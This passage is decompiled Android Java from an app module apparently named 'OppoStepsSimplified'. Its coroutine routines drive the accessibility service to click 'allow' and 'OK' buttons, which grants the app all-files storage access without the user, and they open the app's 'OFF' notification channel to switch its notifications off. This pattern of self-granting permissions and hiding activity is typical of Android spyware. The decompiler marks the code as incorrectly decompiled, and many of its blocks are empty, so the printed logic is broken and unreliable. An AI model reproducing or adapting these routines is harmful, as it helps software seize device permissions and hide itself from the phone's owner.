                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 3;
                c0368a5 = c0368a511;
                if (b81.m210571b1(j4, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a510 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                if (!c0368a510.m212308a3("允许")) {
                }
                m212303e0("✅ 点击[允许]按钮成功");
                j3 = c0368a510.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a510;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 4;
                c0368a5 = c0368a510;
                if (b81.m210571b1(j3, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a59 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                c0368a57 = c0368a59;
                it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                while (it.hasNext()) {
                }
                c0368a58 = c0368a57;
                if (!c0368a58.f55115a4) {
                }
                m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                if (!c0368a58.m212308a3("确定")) {
                }
                j2 = c0368a58.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                c0368a5 = c0368a58;
                if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a56 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z3 = c0368a56.f55117a6;
                c0368a55 = c0368a56;
                if (z3) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 3:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a515 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a515;
                c0368a510 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                if (!c0368a510.m212308a3("允许")) {
                }
                m212303e0("✅ 点击[允许]按钮成功");
                j3 = c0368a510.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a510;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 4;
                c0368a5 = c0368a510;
                if (b81.m210571b1(j3, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a59 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                c0368a57 = c0368a59;
                it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                while (it.hasNext()) {
                }
                c0368a58 = c0368a57;
                if (!c0368a58.f55115a4) {
                }
                m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                if (!c0368a58.m212308a3("确定")) {
                }
                j2 = c0368a58.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                c0368a5 = c0368a58;
                if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a56 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z3 = c0368a56.f55117a6;
                c0368a55 = c0368a56;
                if (z3) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 4:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a516 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a516;
                c0368a59 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                c0368a57 = c0368a59;
                it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                while (it.hasNext()) {
                }
                c0368a58 = c0368a57;
                if (!c0368a58.f55115a4) {
                }
                m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                if (!c0368a58.m212308a3("确定")) {
                }
                j2 = c0368a58.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                c0368a5 = c0368a58;
                if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a56 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z3 = c0368a56.f55117a6;
                c0368a55 = c0368a56;
                if (z3) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 5:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                it = oppoStepsSimplified$executeFileAccess$1.f54562a1;
                C0368a5 c0368a517 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                try {
                    kg1.m213544f4(obj);
                    c0368a57 = c0368a517;
                } catch (Exception e2) {
                    e = e2;
                    Object obj2 = c0368a517;
                    String str2 = "⚠️ 打开文件访问设置失败: " + e.getMessage();
                    obj2.getClass();
                    m212303e0(str2);
                    c0368a52 = obj2;
                    if (i2 >= 2) {
                    }
                    i2++;
                    i3 = 3;
                    c0368a5 = c0368a52;
                    if (i2 < i3) {
                    }
                    if (Environment.isExternalStorageManager()) {
                    }
                    return c1351vv;
                }
                if (Environment.isExternalStorageManager()) {
                }
                c0368a58 = c0368a57;
                if (!c0368a58.f55115a4) {
                }
                m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                if (!c0368a58.m212308a3("确定")) {
                }
                j2 = c0368a58.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                c0368a5 = c0368a58;
                if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a56 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z3 = c0368a56.f55117a6;
                c0368a55 = c0368a56;
                if (z3) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 6:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a518 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a518;
                c0368a56 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z3 = c0368a56.f55117a6;
                c0368a55 = c0368a56;
                if (z3) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 7:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a519 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a519;
                c0368a55 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z2 = c0368a55.f55118a7;
                c0368a53 = c0368a55;
                if (z2) {
                }
                return coroutineSingletons;
            case 8:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a520 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a54 = c0368a520;
                c0368a54.m212308a3("允许");
                j = c0368a54.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a54;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 9;
                c0368a5 = c0368a54;
                if (b81.m210571b1(j, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                c0368a53 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z = c0368a53.f55119a8;
                c0368a5 = c0368a53;
                if (!z) {
                }
                if (i2 < i3) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                return c1351vv;
            case 9:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a521 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a521;
                c0368a53 = c0368a5;
                if (Environment.isExternalStorageManager()) {
                }
                z = c0368a53.f55119a8;
                c0368a5 = c0368a53;
                if (!z) {
                }
                if (i2 < i3) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                return c1351vv;
            case 10:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a522 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a5 = c0368a522;
                c0368a5 = c0368a5;
                if (!Environment.isExternalStorageManager()) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                return c1351vv;
            case oe0.DEFAULT_M /* 11 */:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a523 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a52 = c0368a523;
                if (i2 >= 2) {
                    break;
                }
                i2++;
                i3 = 3;
                c0368a5 = c0368a52;
                if (i2 < i3) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                return c1351vv;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                c0368a52 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                i2++;
                i3 = 3;
                c0368a5 = c0368a52;
                if (i2 < i3) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:29:0x0057  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212326c4(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeFileAccessWithResult$1 oppoStepsSimplified$executeFileAccessWithResult$1;
        C0368a5 c0368a5;
        if (continuationImpl instanceof OppoStepsSimplified$executeFileAccessWithResult$1) {
            oppoStepsSimplified$executeFileAccessWithResult$1 = (OppoStepsSimplified$executeFileAccessWithResult$1) continuationImpl;
            int i = oppoStepsSimplified$executeFileAccessWithResult$1.f54570a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeFileAccessWithResult$1.f54570a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeFileAccessWithResult$1 = new OppoStepsSimplified$executeFileAccessWithResult$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeFileAccessWithResult$1.f54568a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeFileAccessWithResult$1.f54570a3;
        boolean z = false;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                oppoStepsSimplified$executeFileAccessWithResult$1.f54567a0 = this;
                oppoStepsSimplified$executeFileAccessWithResult$1.f54570a3 = 1;
                if (m212325c3(oppoStepsSimplified$executeFileAccessWithResult$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0368a5 = this;
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "❌ 文件访问设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                return Boolean.valueOf(z);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$executeFileAccessWithResult$1.f54567a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "❌ 文件访问设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                return Boolean.valueOf(z);
            }
        }
        if (c0368a5.f55113a2 < 30 || Environment.isExternalStorageManager()) {
            z = true;
        } else if (c0368a5.m212336d9("fileaccess")) {
        }
        return Boolean.valueOf(z);
    }

    /* JADX WARN: Code restructure failed: missing block: B:93:0x018f, code lost:
    
        if (r0.m212354f9(200, r1) != r2) goto L95;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00ab A[Catch: Exception -> 0x00d5, TRY_ENTER, TryCatch #2 {Exception -> 0x00d5, blocks: (B:63:0x00ee, B:45:0x00ab, B:47:0x00b1, B:49:0x00b7, B:52:0x00be, B:53:0x00c2, B:55:0x00c8, B:66:0x00f3, B:75:0x011c, B:77:0x012a, B:85:0x016c, B:78:0x0130, B:80:0x013b, B:82:0x0149, B:84:0x0157, B:60:0x00db), top: B:104:0x00ee }] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x00f0  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x00f3 A[Catch: Exception -> 0x00d5, TRY_LEAVE, TryCatch #2 {Exception -> 0x00d5, blocks: (B:63:0x00ee, B:45:0x00ab, B:47:0x00b1, B:49:0x00b7, B:52:0x00be, B:53:0x00c2, B:55:0x00c8, B:66:0x00f3, B:75:0x011c, B:77:0x012a, B:85:0x016c, B:78:0x0130, B:80:0x013b, B:82:0x0149, B:84:0x0157, B:60:0x00db), top: B:104:0x00ee }] */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0114  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x011c A[Catch: Exception -> 0x00d5, TRY_ENTER, TryCatch #2 {Exception -> 0x00d5, blocks: (B:63:0x00ee, B:45:0x00ab, B:47:0x00b1, B:49:0x00b7, B:52:0x00be, B:53:0x00c2, B:55:0x00c8, B:66:0x00f3, B:75:0x011c, B:77:0x012a, B:85:0x016c, B:78:0x0130, B:80:0x013b, B:82:0x0149, B:84:0x0157, B:60:0x00db), top: B:104:0x00ee }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0185  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0186 A[Catch: Exception -> 0x0039, PHI: r0
      0x0186: PHI (r0v36 com.storm.safe.rock.service.modules.yw5xud.a5) = (r0v34 com.storm.safe.rock.service.modules.yw5xud.a5), (r0v37 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:90:0x0183, B:18:0x003e] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x0039, blocks: (B:13:0x0034, B:95:0x0192, B:18:0x003e, B:92:0x0186, B:21:0x0045, B:89:0x017b, B:24:0x004c, B:73:0x0116, B:27:0x0053, B:70:0x0109, B:35:0x006a), top: B:103:0x0027 }] */
    /* JADX WARN: Type inference failed for: r10v8, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r14v0, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r15v11 */
    /* JADX WARN: Type inference failed for: r15v12, types: [com.storm.safe.rock.service.modules.yw5xud.a5, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r15v27 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x00ea -> B:104:0x00ee). Please report as a decompilation issue!!! */
    /* renamed from: c5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212327c5(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeNotificationManagement$1 oppoStepsSimplified$executeNotificationManagement$1;
        C0368a5 c0368a5;
        ?? r15;
        int i;
        int i2;
        C0368a5 c0368a52;
        C0368a5 c0368a53;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        Context context;
        Context context2 = this.f55112a1;
        if (continuationImpl instanceof OppoStepsSimplified$executeNotificationManagement$1) {
            oppoStepsSimplified$executeNotificationManagement$1 = (OppoStepsSimplified$executeNotificationManagement$1) continuationImpl;
            int i3 = oppoStepsSimplified$executeNotificationManagement$1.f54576a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = i3 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeNotificationManagement$1 = new OppoStepsSimplified$executeNotificationManagement$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeNotificationManagement$1.f54574a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = 0;
        int i5 = 1;
        try {
            switch (oppoStepsSimplified$executeNotificationManagement$1.f54576a5) {
                case 0:
                    kg1.m213544f4(obj);
                    m212303e0("[通知管理] ========== 直接打开OFF频道设置 ==========");
                    try {
                        Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                        intent.putExtra("android.provider.extra.APP_PACKAGE", context2.getPackageName());
                        intent.putExtra("android.provider.extra.CHANNEL_ID", "OFF");
                        intent.setFlags(276824064);
                        context2.startActivity(intent);
                        oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = this;
                        oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 1;
                        if (m212354f9(800L, oppoStepsSimplified$executeNotificationManagement$1) != coroutineSingletons) {
                            c0368a5 = this;
                            r15 = c0368a5;
                            i = 0;
                            i2 = 1;
                            if (i2 >= 6) {
                                i5 = i;
                            } else {
                                try {
                                    AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = r15.m212335d8();
                                    if (accessibilityNodeInfoM212335d8 != null && (listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText("允许通知")) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        Iterator it = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it.hasNext()) {
                                            if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                            }
                                        }
                                    }
                                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = r15;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54572a1 = i;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54573a2 = i2;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 2;
                                    Object objM212354f9 = r15.m212354f9(500L, oppoStepsSimplified$executeNotificationManagement$1);
                                    context = r15;
                                    if (objM212354f9 == coroutineSingletons) {
                                    }
                                    i2++;
                                    r15 = context;
                                    if (i2 >= 6) {
                                    }
                                } catch (Exception e) {
                                    context2 = context;
                                    e = e;
                                    String str = "[通知管理] ❌ 异常: " + e.getMessage();
                                    context2.getClass();
                                    m212303e0(str);
                                    return Boolean.FALSE;
                                }
                            }
                            if (i5 != 0) {
                                r15.getClass();
                                m212303e0("[通知管理] 关闭「允许通知」开关...");
                                if (r15.m212315b2("允许通知")) {
                                    m212303e0("[通知管理] ✅ 渠道已关闭");
                                } else {
                                    m212303e0("[通知管理] ⚠️ 未找到开关，尝试备用...");
                                    AccessibilityNodeInfo accessibilityNodeInfoM212335d82 = r15.m212335d8();
                                    if (accessibilityNodeInfoM212335d82 != null) {
                                        ArrayList arrayList = new ArrayList();
                                        m212302d6(accessibilityNodeInfoM212335d82, arrayList);
                                        int size = arrayList.size();
                                        while (true) {
                                            if (i4 < size) {
                                                Object obj2 = arrayList.get(i4);
                                                i4++;
                                                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj2;
                                                if (accessibilityNodeInfo.isChecked()) {
                                                    accessibilityNodeInfo.getBoundsInScreen(new Rect());
                                                    r15.m212310a5(r0.centerX(), r0.centerY());
                                                }
                                            }
                                        }
                                    }
                                }
                                oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = r15;
                                oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 5;
                                if (r15.m212354f9(300L, oppoStepsSimplified$executeNotificationManagement$1) != coroutineSingletons) {
                                    c0368a52 = r15;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a52;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 6;
                                    if (c0368a52.m212345e9(oppoStepsSimplified$executeNotificationManagement$1) == coroutineSingletons) {
                                        oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a52;
                                        oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 7;
                                        break;
                                    }
                                }
                            } else {
                                r15.getClass();
                                m212303e0("[通知管理] ⚠️ 未进入频道设置页");
                                oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = r15;
                                oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 3;
                                if (r15.m212345e9(oppoStepsSimplified$executeNotificationManagement$1) != coroutineSingletons) {
                                    c0368a53 = r15;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a53;
                                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 4;
                                    if (c0368a53.m212354f9(200L, oppoStepsSimplified$executeNotificationManagement$1) == coroutineSingletons) {
                                    }
                                    c0368a53.m212341e5("notification");
                                    return Boolean.TRUE;
                                }
                            }
                        }
                        return coroutineSingletons;
                    } catch (Exception e2) {
                        e = e2;
                        context2 = this;
                        String str2 = "[通知管理] ❌ 异常: " + e.getMessage();
                        context2.getClass();
                        m212303e0(str2);
                        return Boolean.FALSE;
                    }
                case 1:
                    c0368a5 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    r15 = c0368a5;
                    i = 0;
                    i2 = 1;
                    if (i2 >= 6) {
                    }
                    if (i5 != 0) {
                    }
                    return coroutineSingletons;
                case 2:
                    i2 = oppoStepsSimplified$executeNotificationManagement$1.f54573a2;
                    i = oppoStepsSimplified$executeNotificationManagement$1.f54572a1;
                    ?? r10 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    try {
                        kg1.m213544f4(obj);
                        context = r10;
                        i2++;
                        r15 = context;
                        if (i2 >= 6) {
                        }
                        if (i5 != 0) {
                        }
                        return coroutineSingletons;
                    } catch (Exception e3) {
                        e = e3;
                        context2 = r10;
                        String str22 = "[通知管理] ❌ 异常: " + e.getMessage();
                        context2.getClass();
                        m212303e0(str22);
                        return Boolean.FALSE;
                    }
                case 3:
                    c0368a53 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a53;
                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 4;
                    if (c0368a53.m212354f9(200L, oppoStepsSimplified$executeNotificationManagement$1) == coroutineSingletons) {
                    }
                    c0368a53.m212341e5("notification");
                    return Boolean.TRUE;
                case 4:
                    c0368a53 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    c0368a53.m212341e5("notification");
                    return Boolean.TRUE;
                case 5:
                    c0368a52 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a52;
                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 6;
                    if (c0368a52.m212345e9(oppoStepsSimplified$executeNotificationManagement$1) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 6:
                    c0368a52 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    oppoStepsSimplified$executeNotificationManagement$1.f54571a0 = c0368a52;
                    oppoStepsSimplified$executeNotificationManagement$1.f54576a5 = 7;
                    break;
                case 7:
                    c0368a52 = oppoStepsSimplified$executeNotificationManagement$1.f54571a0;
                    kg1.m213544f4(obj);
                    c0368a52.m212341e5("notification");
                    m212303e0("[通知管理] ========== 完成 ==========");
                    return Boolean.TRUE;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e4) {
            e = e4;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:140:0x0315, code lost:
    
        if (p000.b81.m210571b1(500, r6) == r7) goto L141;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Path cross not found for [B:59:0x00e1, B:63:0x00ed], limit reached: 149 */
    /* JADX WARN: Removed duplicated region for block: B:121:0x0294 A[Catch: Exception -> 0x0048, TryCatch #1 {Exception -> 0x0048, blocks: (B:13:0x0040, B:142:0x0318, B:71:0x0118, B:73:0x013a, B:77:0x014f, B:79:0x0159, B:81:0x015f, B:83:0x0184, B:86:0x0190, B:88:0x019b, B:90:0x01a1, B:92:0x01ba, B:93:0x01bc, B:94:0x01c0, B:96:0x01c6, B:98:0x01d2, B:101:0x01d9, B:103:0x01df, B:106:0x01e6, B:108:0x0224, B:110:0x022a, B:112:0x0230, B:116:0x023a, B:119:0x0286, B:121:0x0294, B:124:0x02a7, B:126:0x02b5, B:128:0x02c0, B:131:0x02da, B:134:0x02ea, B:133:0x02e3, B:139:0x0300, B:143:0x031f, B:18:0x004d, B:21:0x0054, B:24:0x005d, B:27:0x0068, B:30:0x0072, B:33:0x0079, B:68:0x010c), top: B:149:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:126:0x02b5 A[Catch: Exception -> 0x0048, TryCatch #1 {Exception -> 0x0048, blocks: (B:13:0x0040, B:142:0x0318, B:71:0x0118, B:73:0x013a, B:77:0x014f, B:79:0x0159, B:81:0x015f, B:83:0x0184, B:86:0x0190, B:88:0x019b, B:90:0x01a1, B:92:0x01ba, B:93:0x01bc, B:94:0x01c0, B:96:0x01c6, B:98:0x01d2, B:101:0x01d9, B:103:0x01df, B:106:0x01e6, B:108:0x0224, B:110:0x022a, B:112:0x0230, B:116:0x023a, B:119:0x0286, B:121:0x0294, B:124:0x02a7, B:126:0x02b5, B:128:0x02c0, B:131:0x02da, B:134:0x02ea, B:133:0x02e3, B:139:0x0300, B:143:0x031f, B:18:0x004d, B:21:0x0054, B:24:0x005d, B:27:0x0068, B:30:0x0072, B:33:0x0079, B:68:0x010c), top: B:149:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:136:0x02fa  */
    /* JADX WARN: Removed duplicated region for block: B:143:0x031f A[Catch: Exception -> 0x0048, TRY_LEAVE, TryCatch #1 {Exception -> 0x0048, blocks: (B:13:0x0040, B:142:0x0318, B:71:0x0118, B:73:0x013a, B:77:0x014f, B:79:0x0159, B:81:0x015f, B:83:0x0184, B:86:0x0190, B:88:0x019b, B:90:0x01a1, B:92:0x01ba, B:93:0x01bc, B:94:0x01c0, B:96:0x01c6, B:98:0x01d2, B:101:0x01d9, B:103:0x01df, B:106:0x01e6, B:108:0x0224, B:110:0x022a, B:112:0x0230, B:116:0x023a, B:119:0x0286, B:121:0x0294, B:124:0x02a7, B:126:0x02b5, B:128:0x02c0, B:131:0x02da, B:134:0x02ea, B:133:0x02e3, B:139:0x0300, B:143:0x031f, B:18:0x004d, B:21:0x0054, B:24:0x005d, B:27:0x0068, B:30:0x0072, B:33:0x0079, B:68:0x010c), top: B:149:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00d9  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00db A[Catch: Exception -> 0x0084, PHI: r3
      0x00db: PHI (r3v6 ??) = (r3v20 ??), (r3v21 ??) binds: [B:55:0x00d7, B:36:0x0080] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0084, blocks: (B:36:0x0080, B:57:0x00db, B:59:0x00e1, B:61:0x00e7, B:64:0x00ee, B:41:0x008a, B:54:0x00c0), top: B:149:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x010b  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x0118 A[Catch: Exception -> 0x0048, TryCatch #1 {Exception -> 0x0048, blocks: (B:13:0x0040, B:142:0x0318, B:71:0x0118, B:73:0x013a, B:77:0x014f, B:79:0x0159, B:81:0x015f, B:83:0x0184, B:86:0x0190, B:88:0x019b, B:90:0x01a1, B:92:0x01ba, B:93:0x01bc, B:94:0x01c0, B:96:0x01c6, B:98:0x01d2, B:101:0x01d9, B:103:0x01df, B:106:0x01e6, B:108:0x0224, B:110:0x022a, B:112:0x0230, B:116:0x023a, B:119:0x0286, B:121:0x0294, B:124:0x02a7, B:126:0x02b5, B:128:0x02c0, B:131:0x02da, B:134:0x02ea, B:133:0x02e3, B:139:0x0300, B:143:0x031f, B:18:0x004d, B:21:0x0054, B:24:0x005d, B:27:0x0068, B:30:0x0072, B:33:0x0079, B:68:0x010c), top: B:149:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /* JADX WARN: Type inference failed for: r3v0, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r3v1 */
    /* JADX WARN: Type inference failed for: r3v20 */
    /* JADX WARN: Type inference failed for: r3v21 */
    /* JADX WARN: Type inference failed for: r3v6, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r5v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r5v1 */
